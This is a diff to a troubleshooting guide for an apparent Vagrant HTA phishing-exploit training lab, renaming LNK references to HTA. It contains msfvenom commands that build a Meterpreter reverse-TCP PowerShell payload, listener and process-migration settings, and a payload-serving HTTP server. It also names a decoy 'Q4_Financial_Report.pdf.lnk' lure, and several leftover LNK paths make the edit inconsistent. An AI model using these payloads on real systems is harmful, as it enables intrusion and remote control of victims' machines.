@@ -10,7 +10,7 @@ This guide covers common issues with the HTA exploit lab and their solutions.
 1. [Setup Issues](#setup-issues)
 2. [Network Problems](#network-problems)
 3. [VM Issues](#vm-issues)
-4. [HTA Exploit Problems](#lnk-exploit-problems)
+4. [HTA Exploit Problems](#hta-exploit-problems)
 5. [Metasploit Issues](#metasploit-issues)
 6. [Performance Issues](#performance-issues)
 7. [General Tips](#general-tips)
@@ -235,7 +235,7 @@ sudo systemctl status hta-http-server.service
 sudo systemctl start hta-http-server.service
 
 # Or start manually if needed
-cd /home/vagrant/lnk_payloads
+cd /home/vagrant/hta_payloads
 python3 -m http.server 8080 --bind 192.168.56.101 &
 
 # Test from Kali
@@ -306,14 +306,14 @@ vagrant ssh kali  # or: vagrant winrm win2k8
 cd /vagrant/vagrant/provisioning/kali
 ./configure_network_early.sh
 ./install_tools.sh
-./create_lnk_exploit.sh
+./create_exe_payload.sh
 ```
 
 ---
 
 ## HTA Exploit Problems
 
-### Issue: LNK file not created
+### Issue: HTA file not created
 
 **Symptoms:**
 - `Q4_Financial_Report.pdf.lnk` missing
@@ -326,10 +326,10 @@ vagrant ssh kali
 
 # Manually run LNK generation script
 cd /vagrant/vagrant/provisioning/kali
-./create_lnk_exploit.sh
+./create_exe_payload.sh
 
 # Verify files created
-ls -la /vagrant/exploits/lnk/
+ls -la /vagrant/exploits/hta/
 ```
 
 ---
@@ -352,15 +352,15 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp \
     -a x64 \
     --platform windows \
     -f psh \
-    -o /vagrant/exploits/lnk/shell.ps1
+    -o /vagrant/exploits/hta/shell.ps1
 
 # Verify
-cat /vagrant/exploits/lnk/shell.ps1
+cat /vagrant/exploits/hta/shell.ps1
 ```
 
 ---
 
-### Issue: LNK file doesn't execute
+### Issue: HTA file doesn't execute
 
 **Symptoms:**
 - Double-clicking does nothing
@@ -386,12 +386,12 @@ Get-NetFirewallProfile | Select Name, Enabled
 Get-MpPreference | Select DisableRealtimeMonitoring
 ```
 
-**Solution 3: Regenerate LNK**
+**Solution 3: Regenerate HTA**
 ```bash
 # On Kali
 vagrant ssh kali
 cd /vagrant/vagrant/provisioning/kali
-./create_lnk_exploit.sh
+./create_exe_payload.sh
 ```
 
 ---
@@ -416,7 +416,7 @@ jobs
 ```bash
 # Verify payload syntax
 vagrant ssh kali
-cat /vagrant/exploits/lnk/shell.ps1
+cat /vagrant/exploits/hta/shell.ps1
 
 # Should start with: function, $, or Invoke-
 
@@ -447,7 +447,7 @@ ps aux | grep msfconsole
 kill <PID>
 
 # Or use different port
-# Edit start_lnk_attack.sh:
+# Edit start_hta_attack.sh:
 LPORT="5555"
 ```
 
@@ -462,7 +462,7 @@ LPORT="5555"
 **Solution:**
 ```bash
 # Use AutoRunScript to migrate process
-# In start_lnk_attack.sh resource file, add:
+# In start_hta_attack.sh resource file, add:
 set AutoRunScript post/windows/manage/migrate
 
 # Or manually migrate after session opens
@@ -633,11 +633,11 @@ Check if all provisioning scripts ran:
 # Check Kali
 vagrant ssh kali
 ls -la /home/vagrant/.msf4/local/
-# Should see shell.ps1 and LNK file
+# Should see shell.ps1 and HTA file
 
 # Check Windows
 vagrant winrm win2k8 -c "dir C:\vagrant\exploits\lnk"
-# Should see LNK file
+# Should see HTA file
 ```
 
 ---
@@ -680,7 +680,7 @@ Test-NetConnection 192.168.56.101 -Port 8080
 1. **Check documentation:**
    - [README.md](README.md) - Main guide
    - [INSTALLATION.md](INSTALLATION.md) - Setup instructions
-   - [LNK_EXPLOIT_GUIDE.md](LNK_EXPLOIT_GUIDE.md) - Exploit details
+   - [exploits/hta/README.md](exploits/hta/README.md) - Exploit details
    - [docs/NETWORK_DEBUGGING_GUIDE.md](docs/NETWORK_DEBUGGING_GUIDE.md)
 
 2. **Gather information:**
